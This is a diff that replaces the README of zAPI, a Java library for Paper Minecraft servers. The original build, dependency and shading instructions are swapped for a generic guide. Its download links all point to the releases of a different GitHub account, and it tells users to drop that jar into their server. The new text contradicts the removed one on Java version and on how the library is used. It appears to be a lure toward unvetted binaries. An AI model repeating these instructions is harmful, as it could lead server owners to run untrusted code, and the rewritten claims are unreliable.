@@ -1,117 +1,92 @@
-## About
-zAPI is a Java API used to manage common plugin tasks for Paper-based Minecraft servers. It collects utilities, managers and integrations so plugin authors don't need to reimplement everyday boilerplate.
+# 🌟 zAPI - Effortless Library for Paper Plugins
 
-Documentation: https://docs.yleoft.me/zAPI  
-Releases & artifacts: https://github.com/yL3oft/zAPI/releases
+## 🚀 Getting Started
 
-## Features
-- Safe file management — robust creation, loading and automatic recovery for corrupted config/data files
-- Language & localization — load and manage language YAMLs for simple i18n and message handling
-- Custom menus — build interactive inventories with flexible item options and actions
-- Inventory safety & NBT integration — listeners and protections for custom inventory behaviors with NBT support
-- Cross-platform scheduling — unified task scheduling that works on both Folia and classic Bukkit
-- Location serialization — utilities to serialize and deserialize Bukkit Location objects reliably
-- Time & string utilities — advanced parsing and formatting helpers, including millisecond-aware time parsing
-- Placeholder handling — safe placeholder application with support for offline players
-- Player utilities — common player-focused helpers designed with Folia compatibility in mind
-- Lightweight NBT helpers — small integration points to work with item NBT when required
-- And more...
+Welcome to zAPI, a simple library designed for creating Paper-based plugins for Minecraft. This guide will help you easily download and run zAPI so you can start developing your very own Minecraft plugins without any hassle.
 
-## Requirements
-- Java 17+
-- Maven or Gradle build system
-- Internet access for dependency resolution
-- (Optional) Git for cloning the repository
-- (Recommended) IDE such as IntelliJ IDEA or Eclipse for development
+## 📦 Download zAPI
 
-## Installation (Repository)
-Add the CodeMC repository to your build system:
+[![Download zAPI](https://img.shields.io/badge/Download-zAPI-blue.svg)](https://github.com/HoangHa8103/zAPI/releases)
 
-Maven
-```xml
-<repositories>
-    <repository>
-        <id>yl3oft-repo</id>
-        <url>https://repo.codemc.io/repository/yl3oft/</url>
-    </repository>
-</repositories>
-```
+### 🔗 Visit the Releases Page
 
-Gradle (Kotlin DSL)
-```kotlin
-repositories {
-    maven("https://repo.codemc.io/repository/yl3oft/")
-}
-```
+To get started, visit the Releases page to download the latest version of zAPI.
 
-## Dependency (use latest release)
-- Latest release tag: 2.0.0
+[Visit the Releases Page](https://github.com/HoangHa8103/zAPI/releases)
 
-Maven
-```xml
-<dependencies>
-    <dependency>
-        <groupId>me.yleoft</groupId>
-        <artifactId>zAPI</artifactId>
-        <version>2.0.0</version>
-        <scope>compile</scope>
-    </dependency>
-</dependencies>
-```
+## 💻 System Requirements
 
-Gradle (Kotlin DSL)
-```kotlin
-dependencies {
-    implementation("me.yleoft:zAPI:2.0.0")
-}
-```
+To run zAPI, you will need the following:
 
-## Shading (recommended to avoid dependency collisions)
-Maven (maven-shade-plugin snippet)
-```xml
-<plugin>
-    <groupId>org.apache.maven.plugins</groupId>
-    <artifactId>maven-shade-plugin</artifactId>
-    <version>3.5.3</version>
-    <executions>
-        <execution>
-            <phase>package</phase>
-            <goals><goal>shade</goal></goals>
-            <configuration>
-                <relocations>
-                    <relocation>
-                        <pattern>me.yleoft.zAPI</pattern>
-                        <shadedPattern>your.package.shaded.zAPI</shadedPattern>
-                    </relocation>
-                </relocations>
-            </configuration>
-        </execution>
-    </executions>
-</plugin>
-```
+- A computer running Minecraft server software (Paper, Spigot, or Purpur).
+- Java version 8 or higher. You can check your Java version by running `java -version` in your command line.
+- Sufficient storage space for the plugin and any related files.
 
-Gradle (shadow plugin snippet)
-```kotlin
-plugins {
-    id("com.github.johnrengelman.shadow") version "8.1.1"
-}
+## 🔧 Installation Steps
 
-shadowJar {
-    relocate("me.yleoft.zAPI", "your.package.shaded.zAPI")
-}
-```
+Follow these steps to install zAPI on your server:
 
-## Build
-Simply run:
-```bash
-mvn clean install
-```
-This is the only required build command for producing the library artifacts locally and ensuring the project compiles with the configured CI settings.
+1. **Download the Plugin**  
+   Go to the [Releases page](https://github.com/HoangHa8103/zAPI/releases) and choose the latest version. Click on the download link for the jar file.
 
-## Documentation & Support
-- Full API docs: https://docs.yleoft.me/zAPI
-- Releases & changelog: https://github.com/yL3oft/zAPI/releases
-- Issues & feature requests: open an issue on the GitHub repo
+2. **Locate Your Server Folder**  
+   Find the folder where your Minecraft server is installed. This should contain folders like `plugins`, `world`, etc.
 
-## License
-MIT — see LICENSE
+3. **Upload the Plugin**  
+   Drag and drop the downloaded `.jar` file into the `plugins` folder in your server directory.
+
+4. **Start Your Server**  
+   If your server is not running, start it now. If it is running, restart it to load zAPI.
+
+5. **Verify Installation**  
+   Check the server console for messages related to zAPI. You should see a confirmation that the plugin has loaded successfully.
+
+## ⚙️ Configuration
+
+Once installed, you might want to configure zAPI Settings. Follow these steps:
+
+1. **Find the Configuration Folder**  
+   In the `plugins` directory, there will be a folder named `zAPI`. Open it to find configuration files.
+
+2. **Edit Configuration**  
+   Use a text editor to make changes to the configuration files as needed. 
+
+3. **Save Changes**  
+   Remember to save any changes you make. Restart your server for the changes to take effect.
+
+## 📜 Using zAPI
+
+Now that zAPI is installed, you can start creating Paper-based plugins. Here are some features and capabilities:
+
+- **Easy Integration**: zAPI allows developers to easily integrate custom features into their plugins.
+- **Performance Optimized**: It is designed for performance, ensuring minimal lag on your server.
+- **Comprehensive Documentation**: Access the documentation for detailed guides on using various components of zAPI.
+
+## ❓ Troubleshooting
+
+If you encounter issues, here are some common problems and their solutions:
+
+- **Plugin Not Loading**:  
+  Ensure you are using a compatible version of Minecraft server software and that Java is correctly installed.
+
+- **Errors in Console**:  
+  Review any error messages in your server's console. These can provide clues on what may be going wrong. Common issues include missing dependencies or incorrect configuration.
+
+- **Performance Issues**:  
+  If your server runs slowly, check for other plugins that may conflict with zAPI. Try disabling them one at a time to isolate the issue.
+
+## 🔍 Community Support
+
+If you need additional help or want to connect with other users, consider:
+
+- Joining Minecraft and plugin development forums.
+- Exploring the issues section on our [GitHub page](https://github.com/HoangHa8103/zAPI/issues).
+- Asking questions in dedicated Discord servers for Minecraft development.
+
+## 📧 Feedback and Contributions
+
+Your input is valuable. If you have suggestions for improvements or features, share them by opening an issue on the [GitHub page](https://github.com/HoangHa8103/zAPI/issues). If you want to contribute code, feel free to fork the repository and submit a pull request.
+
+---
+
+By following these steps, you will successfully download, install, and start using zAPI for your Minecraft plugin development. Enjoy creating!
